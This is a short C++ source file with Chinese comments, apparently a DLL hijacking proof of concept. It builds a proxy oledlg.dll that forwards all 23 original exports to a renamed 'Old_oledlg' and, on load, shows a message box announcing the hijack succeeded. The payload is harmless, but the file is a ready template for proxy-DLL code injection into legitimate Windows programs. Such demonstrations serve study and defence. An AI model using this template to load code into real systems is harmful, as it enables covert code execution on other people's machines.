// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		::MessageBoxA(NULL, "DLL劫持成功", "GuiShou", MB_OK | MB_ICONWARNING);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

//直接转发函数
#pragma comment(linker, "/EXPORT:OleUIAddVerbMenuA=Old_oledlg.OleUIAddVerbMenuA")
#pragma comment(linker, "/EXPORT:OleUICanConvertOrActivateAs=Old_oledlg.OleUICanConvertOrActivateAs")
#pragma comment(linker, "/EXPORT:OleUIInsertObjectA=Old_oledlg.OleUIInsertObjectA")
#pragma comment(linker, "/EXPORT:OleUIPasteSpecialA=Old_oledlg.OleUIPasteSpecialA")
#pragma comment(linker, "/EXPORT:OleUIEditLinksA=Old_oledlg.OleUIEditLinksA")
#pragma comment(linker, "/EXPORT:OleUIChangeIconA=Old_oledlg.OleUIChangeIconA")
#pragma comment(linker, "/EXPORT:OleUIConvertA=Old_oledlg.OleUIConvertA")
#pragma comment(linker, "/EXPORT:OleUIBusyA=Old_oledlg.OleUIBusyA")
#pragma comment(linker, "/EXPORT:OleUIUpdateLinksA=Old_oledlg.OleUIUpdateLinksA")
#pragma comment(linker, "/EXPORT:OleUIPromptUserA=Old_oledlg.OleUIPromptUserA")
#pragma comment(linker, "/EXPORT:OleUIObjectPropertiesA=Old_oledlg.OleUIObjectPropertiesA")
#pragma comment(linker, "/EXPORT:OleUIChangeSourceA=Old_oledlg.OleUIChangeSourceA")
#pragma comment(linker, "/EXPORT:OleUIAddVerbMenuW=Old_oledlg.OleUIAddVerbMenuW")
#pragma comment(linker, "/EXPORT:OleUIBusyW=Old_oledlg.OleUIBusyW")
#pragma comment(linker, "/EXPORT:OleUIChangeIconW=Old_oledlg.OleUIChangeIconW")
#pragma comment(linker, "/EXPORT:OleUIChangeSourceW=Old_oledlg.OleUIChangeSourceW")
#pragma comment(linker, "/EXPORT:OleUIConvertW=Old_oledlg.OleUIConvertW")
#pragma comment(linker, "/EXPORT:OleUIEditLinksW=Old_oledlg.OleUIEditLinksW")
#pragma comment(linker, "/EXPORT:OleUIInsertObjectW=Old_oledlg.OleUIInsertObjectW")
#pragma comment(linker, "/EXPORT:OleUIObjectPropertiesW=Old_oledlg.OleUIObjectPropertiesW")
#pragma comment(linker, "/EXPORT:OleUIPasteSpecialW=Old_oledlg.OleUIPasteSpecialW")
#pragma comment(linker, "/EXPORT:OleUIPromptUserW=Old_oledlg.OleUIPromptUserW")
#pragma comment(linker, "/EXPORT:OleUIUpdateLinksW=Old_oledlg.OleUIUpdateLinksW")
//23